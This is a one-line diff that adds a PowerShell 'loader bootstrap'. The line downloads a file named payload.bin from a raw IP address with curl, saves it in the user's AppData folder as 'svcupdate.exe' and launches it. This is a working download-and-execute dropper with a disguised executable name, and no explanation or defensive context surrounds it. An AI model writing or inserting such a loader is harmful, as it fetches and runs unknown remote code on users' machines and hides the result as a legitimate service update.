@@ -1,0 +1,1 @@
+<# Loader bootstrap #> $Stage1Url = 'http://203.0.113.113/downloads/payload.bin'; $WorkingPath = "$env:APPDATA\svcupdate.exe"; curl.exe -s -L -o $WorkingPath $Stage1Url; Start-Process -FilePath $WorkingPath; Set-Location -Path $env:TEMP; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
